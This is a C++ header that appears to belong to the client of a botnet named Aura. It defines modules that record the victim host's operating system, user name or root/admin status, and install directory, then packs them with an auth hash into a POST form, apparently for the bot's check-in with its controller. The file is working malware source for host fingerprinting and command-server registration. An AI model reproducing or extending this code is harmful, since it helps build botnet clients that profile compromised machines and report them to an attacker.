#ifndef SYSINFO_HH
#define SYSINFO_HH

#include <memory>
#include <regex>
#include <string>
#include <vector>

#include "constants.hh"
#include "request.hh"
#include "util.hh"

// Field constants denote field name to be used in POST request forms
namespace {
const std::string HASH_TYPE("SHA256");

const std::string VERSION_FIELD("version");
const std::string HASH_TYPE_FIELD("hash_type");
const std::string OS_FIELD("operating_sys");
const std::string USER_FIELD("user");
}  // namespace

namespace sysinfo {

/* Base class for holding arbitrary system information such as user name, bot
 * version, and operating system*/
class DataModule {
   public:
    std::pair<std::string, std::string> Get();

   protected:
    std::string field_name_;
    std::string data_;

    virtual void Collect() = 0;
};

std::pair<std::string, std::string> DataModule::Get() {
    if (data_.empty()) Collect();
    return std::make_pair(field_name_, data_);
}

#define DEFINE_DATA_MODULE(ModuleName, FieldName) \
    class ModuleName : public DataModule {        \
       public:                                    \
        ModuleName() { field_name_ = FieldName; } \
                                                  \
       protected:                                 \
        void Collect();                           \
    };

DEFINE_DATA_MODULE(VersionInfo, VERSION_FIELD);
DEFINE_DATA_MODULE(HashTypeInfo, HASH_TYPE_FIELD);
DEFINE_DATA_MODULE(OSInfo, OS_FIELD);
DEFINE_DATA_MODULE(UserInfo, USER_FIELD);

#undef DEFINE_DATA_MODULE

void VersionInfo::Collect() { data_ = AURA_VERSION; }

void HashTypeInfo::Collect() { data_ = HASH_TYPE; }

void OSInfo::Collect() {
#ifdef __linux__

    data_ = util::PopenSubprocess("uname | tr -d '\n'");

#endif

#ifdef WIN32

    std::string win_version =
        util::PopenSubprocess("systeminfo | findstr /B /C:\"OS Name\"");
    std::regex pattern("[\\n\\r\\s]*.*?(Windows\\s*\\S+).*[\\n\\r\\s]*");
    std::smatch match;
    std::regex_match(win_version, match, pattern);

    data_ = match[1];

#endif
}

void UserInfo::Collect() {
#ifdef __linux__

    data_ = util::IsSuperuser() ? "root" : std::getenv("USER");

#endif

#ifdef WIN32

    data_ = util::IsSuperuser()
                ? ADMIN_INSTALL_DIR + "\\"
                : std::getenv("USERPROFILE") + ("\\" + INSTALL_DIR + "\\");

#endif
}

// Holds pointers to DataModule objects and creates POST form from them
class DataList {
   public:
    DataList(std::string auth_hash);
    std::string GetPostData();

   private:
    std::string auth_hash_;
    std::vector<std::unique_ptr<DataModule>> list_;
};

DataList::DataList(std::string auth_hash) {
    auth_hash_ = auth_hash;
    list_.emplace_back(std::move(std::make_unique<VersionInfo>()));
    list_.emplace_back(std::move(std::make_unique<HashTypeInfo>()));
    list_.emplace_back(std::move(std::make_unique<OSInfo>()));
    list_.emplace_back(std::move(std::make_unique<UserInfo>()));
}

// Use request::PostForm to convert DataModules to POST data
std::string DataList::GetPostData() {
    request::PostForm post_form;
    std::string field, value;

    for (auto& module : list_) {
        std::tie(field, value) = module->Get();
        post_form.AddField(field, value);
    }

    post_form.AddField("hash_sum", auth_hash_);

    return post_form.ToString();
}

}  // namespace sysinfo

#endif  // SYSINFO_HH